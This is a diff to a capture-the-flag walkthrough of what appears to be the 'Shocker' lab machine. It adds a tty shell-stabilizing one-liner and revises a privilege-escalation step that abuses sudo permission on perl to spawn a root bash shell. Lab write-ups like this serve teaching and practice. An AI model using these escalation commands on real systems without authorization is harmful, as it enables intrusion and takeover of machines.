@@ -328,6 +328,14 @@ shelly@Shocker:/usr/lib/cgi-bin$
 
 It caught the reverse shell!
 
+### Stabilizing the shell
+
+I'll use this one-liner to stabilize a bit the shell by spawning a tty:
+
+```sh
+script "/dev/null" -qc "/bin/bash"
+```
+
 ## Getting a lay of the land
 
 If we run `whoami`, we see that we got a foothold as `shelly`.
@@ -548,22 +556,22 @@ If we search [GTFOBins](https://gtfobins.github.io/) for `perl`, we find
 
 ### Exploitation
 
-I'll just copy and paste the given command to abuse our `sudo` permissions, but
-I'll change the shell to `/bin/bash`:
+I'll use the given command to abuse our `sudo` permissions, but I'll change the
+shell to `/bin/bash`:
 
 ```sh
-shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash";'
+shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash -i";'
 ```
 
 ```
-
+root@Shocker:/usr/lib/cgi-bin#
 ```
 
 Yay!
 
 ### Stabilizing the shell
 
-I'll use this one-liner to stabilize a bit the shell:
+I'll use this one-liner to stabilize a bit the shell by spawning a tty:
 
 ```sh
 script "/dev/null" -qc "/bin/bash"
